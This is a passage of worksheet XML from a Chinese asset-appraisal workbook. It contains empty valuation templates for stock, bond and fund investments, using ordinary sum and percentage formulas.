      <c r="E26" s="580" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>ROUND(SUM(H6:H26),2)</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：减值准备</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="555">
        <f>F27-F28</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>G27-G28</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>H27-H28</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>H29-G29</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>IF(G29=0,"",I29/G29*100)</f>
        <v/>
      </c>
      <c r="K29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="J3:K3"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B2:K2"/>
    <mergeCell ref="B27:C27"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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2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 codeName="Sheet46">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:H25"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="L21" sqref="L21"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.5" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="7.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="28" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col width="14.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他非流动金融资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表4-6</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>4-6-1</t>
        </is>
      </c>
      <c r="C6" s="284" t="inlineStr">
        <is>
          <t>可售股票</t>
        </is>
      </c>
      <c r="D6" s="284" t="inlineStr">
        <is>
          <t>其他非流动金融资产-股票投资</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'4-6-1-股票'!H29</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'4-6-1-股票'!J29</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>4-6-2</t>
        </is>
      </c>
      <c r="C7" s="284" t="inlineStr">
        <is>
          <t>可售债券</t>
        </is>
      </c>
      <c r="D7" s="284" t="inlineStr">
        <is>
          <t>其他非流动金融资产-债券投资</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'4-6-2-债券'!I29</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'4-6-2-债券'!J29</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>4-6-3</t>
        </is>
      </c>
      <c r="C8" s="284" t="inlineStr">
        <is>
          <t>可售其他</t>
        </is>
      </c>
      <c r="D8" s="284" t="inlineStr">
        <is>
          <t>其他非流动金融资产-基金投资</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'4-6-3-基金'!H31</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-6-3-基金'!J31</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="284" t="n"/>
      <c r="D9" s="284" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="383" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="383" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="383" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="383" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="383" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="383" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="383" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="383" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="383" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="383" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="383" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="383" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="383" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="383" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="A24" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="inlineStr">
        <is>
          <t>可售汇总</t>
        </is>
      </c>
      <c r="D24" s="380" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="E24" s="555">
        <f>SUM(E6:E23)</f>
        <v/>
      </c>
      <c r="F24" s="555">
        <f>SUM(F6:F23)</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
    </row>
    <row r="25" s="415">
      <c r="B25" s="346" t="n"/>
      <c r="C25" s="346" t="n"/>
      <c r="D25" s="347" t="n"/>
      <c r="E25" s="347" t="n"/>
      <c r="F25" s="325" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F25:H25"/>
  </mergeCells>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="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 codeName="Sheet47">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="16.1666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="7" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="8.5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其他非流动金融资产金融资产—股票投资评估明细表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402" t="inlineStr">
        <is>
          <t>表4-6-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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176" t="n"/>
      <c r="M4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>股票名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>持股数量</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>成  本</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>基准日收盘价元/股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Format="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="180" t="n"/>
      <c r="D6" s="185" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="233" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-H6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(H6=0,"",K6/H6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="233" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-H7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(H7=0,"",K7/H7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="233" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-H8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(H8=0,"",K8/H8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="233" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-H9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(H9=0,"",K9/H9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="233" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-H10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(H10=0,"",K10/H10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="233" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-H11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(H11=0,"",K11/H11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="233" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-H12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(H12=0,"",K12/H12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="233" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-H13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(H13=0,"",K13/H13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="233" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-H14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(H14=0,"",K14/H14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="233" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-H15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(H15=0,"",K15/H15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="233" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-H16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(H16=0,"",K16/H16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="233" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-H17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(H17=0,"",K17/H17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="233" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-H18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(H18=0,"",K18/H18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="233" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-H19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(H19=0,"",K19/H19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="233" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-H20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(H20=0,"",K20/H20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="233" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-H21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(H21=0,"",K21/H21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="233" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-H22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(H22=0,"",K22/H22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="233" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-H23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(H23=0,"",K23/H23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="233" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-H24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(H24=0,"",K24/H24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="233" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-H25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(H25=0,"",K25/H25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
